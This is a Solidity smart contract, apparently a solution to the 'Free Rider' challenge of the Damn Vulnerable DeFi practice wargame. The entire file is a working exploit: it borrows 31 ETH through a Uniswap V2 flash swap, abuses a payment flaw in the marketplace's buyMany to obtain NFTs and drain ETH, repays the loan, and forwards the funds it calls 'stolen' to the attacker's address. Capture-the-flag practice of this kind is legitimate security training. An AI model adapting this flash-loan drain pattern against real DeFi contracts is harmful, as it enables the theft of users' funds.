// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IWETH.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "./FreeRiderNFTMarketplace.sol";

contract FreeRiderAttack is IERC721Receiver {

    FreeRiderNFTMarketplace market;
    IUniswapV2Pair          uniswapV2Pair;
    address                 recoveryAddr;
    address                 playerAddr;
    uint256 constant        LOAN_AMOUNT = 31 ether;

    constructor(address payable _market, address _uniswapV2Pair, address _recoveryAddr, address _playerAddr) {
        market        = FreeRiderNFTMarketplace(_market);
        uniswapV2Pair = IUniswapV2Pair(_uniswapV2Pair);
        recoveryAddr  = _recoveryAddr;
        playerAddr    = _playerAddr;
    }

    function onERC721Received(address, address, uint256, bytes calldata) external pure override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    function attack() external {
        uniswapV2Pair.swap(LOAN_AMOUNT, 0, address(this), hex"00");
    }

    function uniswapV2Call(address, uint, uint, bytes calldata) external {
        IWETH weth = IWETH(uniswapV2Pair.token0());

        weth.withdraw(LOAN_AMOUNT);

        uint256[] memory nftIds = new uint256[](6);
        for(uint8 i=0; i<6;) {
            nftIds[i] = i;
            ++i;
        }

        market.buyMany{value: 15 ether}(nftIds);

        market.token().setApprovalForAll(address(market), true);
        uint256[] memory nftIds2 = new uint256[](2);
        uint256[] memory prices  = new uint256[](2);
        for(uint8 i=0; i<2;) {
            nftIds2[i] = i;
            prices[i]  = 15 ether;
            ++i;        
        }

        market.offerMany(nftIds2, prices);

        market.buyMany{value: 15 ether}(nftIds2);
        DamnValuableNFT nft = DamnValuableNFT(market.token());
        for (uint8 i=0; i<6;) {
            nft.safeTransferFrom(address(this), recoveryAddr, i, abi.encode(playerAddr));
            ++i;
        }

        uint256 fee = ((LOAN_AMOUNT * 3) / uint256(997)) + 1;
        weth.deposit{value: LOAN_AMOUNT + fee}();
        weth.transfer(address(uniswapV2Pair), LOAN_AMOUNT + fee);

        // forward eth stolen from market to attacker
        payable(playerAddr).transfer(address(this).balance);
    }

    receive() external payable {}
}
